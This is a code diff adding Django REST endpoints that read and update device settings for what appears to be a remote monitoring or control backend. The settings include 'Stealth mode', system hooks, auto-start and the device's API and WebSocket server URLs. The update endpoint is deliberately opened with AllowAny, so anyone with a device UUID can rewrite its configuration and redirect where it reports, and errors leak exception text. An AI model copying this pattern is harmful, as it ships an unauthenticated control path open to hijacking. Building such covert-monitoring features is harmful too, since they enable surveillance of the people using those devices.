@@ -283,3 +283,91 @@ def upload_screenshots(request):
         'result': 'error',
         'message': serializer.errors
     }, status=status.HTTP_400_BAD_REQUEST)
+
+
+@api_view(['GET'])
+@permission_classes([IsAuthenticated])
+def get_device_settings(request):
+    """
+    Get device settings for remote control
+    GET /api/v1/settings
+
+    Returns current device settings that can be modified remotely from WebApp
+    """
+    try:
+        device = request.device
+
+        # Get or create settings for this device
+        from apps.devices.models import DeviceSettings
+        settings, created = DeviceSettings.objects.get_or_create(device=device)
+
+        from apps.api.serializers import DeviceSettingsSerializer
+        serializer = DeviceSettingsSerializer(settings)
+
+        return Response({
+            'result': 'ok',
+            'settings': serializer.data
+        }, status=status.HTTP_200_OK)
+
+    except Exception as e:
+        return Response({
+            'result': 'error',
+            'message': str(e)
+        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+
+
+@api_view(['PUT', 'PATCH'])
+@permission_classes([AllowAny])  # Allow WebApp to update without device auth
+def update_device_settings(request, device_uuid):
+    """
+    Update device settings remotely (called by WebApp)
+    PUT/PATCH /api/v1/devices/{uuid}/settings
+
+    Allows WebApp to remotely change device configuration:
+    - API and WebSocket URLs
+    - Stealth mode
+    - Auto-start
+    - System hooks enable/disable
+    - Module enable/disable
+    - Sync interval
+    """
+    try:
+        from apps.devices.models import Device, DeviceSettings
+
+        # Find device by UUID
+        try:
+            device = Device.objects.get(uuid=device_uuid)
+        except Device.DoesNotExist:
+            return Response({
+                'result': 'error',
+                'message': 'Device not found'
+            }, status=status.HTTP_404_NOT_FOUND)
+
+        # Get or create settings
+        settings, created = DeviceSettings.objects.get_or_create(device=device)
+
+        # Update settings
+        from apps.api.serializers import DeviceSettingsSerializer
+        serializer = DeviceSettingsSerializer(
+            settings,
+            data=request.data,
+            partial=(request.method == 'PATCH')
+        )
+
+        if serializer.is_valid():
+            serializer.save()
+            return Response({
+                'result': 'ok',
+                'settings': serializer.data
+            }, status=status.HTTP_200_OK)
+
+        return Response({
+            'result': 'error',
+            'message': serializer.errors
+        }, status=status.HTTP_400_BAD_REQUEST)
+
+    except Exception as e:
+        return Response({
+            'result': 'error',
+            'message': str(e)
+        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
